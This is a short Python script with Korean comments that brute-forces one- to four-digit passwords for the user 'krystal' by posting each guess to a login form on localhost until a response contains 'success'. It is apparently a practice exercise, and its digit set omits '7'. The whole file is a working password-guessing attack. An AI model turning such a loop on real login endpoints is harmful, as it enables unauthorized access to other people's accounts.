import itertools
import requests

문자열 = '012345689'  # 패스워드로 쓸 수 있는 숫자를 뜻함


#한 자리에서부터 4자리까지 패스워드 길이를 모두 맞춰본다
#이때, 문자열에서 가져온다
#그렇게 나온 tuple을 join을 통해 조합해준다 
#만든 pw를 로그인패킷에 넣어준 후, 패킷을 날려준다.
for 패스워드길이 in range(1, 5):
    for password in itertools.product(문자열, repeat=패스워드길이):
        pw=''.join(password)
        print(pw)
        로그인패킷={
    'id' : 'krystal',
    'pw' : pw, #마지막에도 콤마 잊지말기
        }
        address = requests.post(f'http://127.0.0.1:8080/',data=로그인패킷) # local host
        if address.text.find('success')>0:
            exit()



    
# 응답한 값이 들어간 address (response라는 변수로 보통 많이 씀)



